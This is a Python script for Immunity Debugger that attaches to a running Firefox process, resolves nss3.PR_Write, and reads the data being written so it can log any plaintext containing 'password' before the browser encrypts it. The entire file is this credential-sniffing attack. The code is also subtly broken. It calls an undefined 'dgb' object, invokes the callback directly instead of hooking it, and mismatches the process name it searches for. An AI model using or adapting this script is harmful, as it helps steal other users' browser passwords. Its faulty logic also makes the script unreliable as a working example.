import immlib
import sys

# This is our entry hook callback function
# we hooked, the one we are interested in is args
def sniff( dbg, args ):
    pattern   = "password"

    # Now we read out the memory pointed to by the second argument
    # it is stored as an ASCII string, so we'll loop on a read until
    # we reach a NULL byte
    buffer  = ""
    offset  = 0

    while 1:
        byte = dbg.readMemory( args +8+ offset, 1 )
        if byte != "\x00":
            buffer  += byte
            offset  += 1
            continue
        else:
            break

    if pattern in buffer:
        dgb.log("Pre-Encrypted: %s" % buffer)

    return 65538


def main(args):

    imm     = immlib.Debugger()
    found_firefox = False

    
# Quick and dirty process enumeration to find firefox.exe
    for (pid, name, path, services, tcp, udp) in imm.ps():

        if name.lower() == "firefox":
            found_firefox = True
            imm.Attach(pid)
            imm.log("[*] Attaching to firefox.exe with PID: %d" % pid)
            imm.run()
            hooks  = imm.listHooks()
            imm.log("[*] Hooks set, continuing process.")
            imm.getAllModules()
            hook_address = imm.getAddress("nss3.PR_Write")
            
            if hook_address:
            # Add the hook to the container, we aren't interested
                imm.setLoggingBreakpoint(hook_address)
                imm.log("[*] nss3.PR_Write hooked at: 0x%08x" % hook_address)
                 # hook  callback function to nss3.PR_Write
                sniff(imm,hook_address)
                break
            else:
                imm.log ("[*] Error: Couldn't resolve hook address.")
                sys.exit(-1)


    if found_firefox==True:    
        imm.log ("[*] Hooks set, continuing process.")
        #imm.run()
    else:    
        imm.log ("[*] Error: Couldn't find the firefox.exe process. Please fire up firefox first.")
        sys.exit()
    return "[*]Hooks set, press F9 to continue the process."
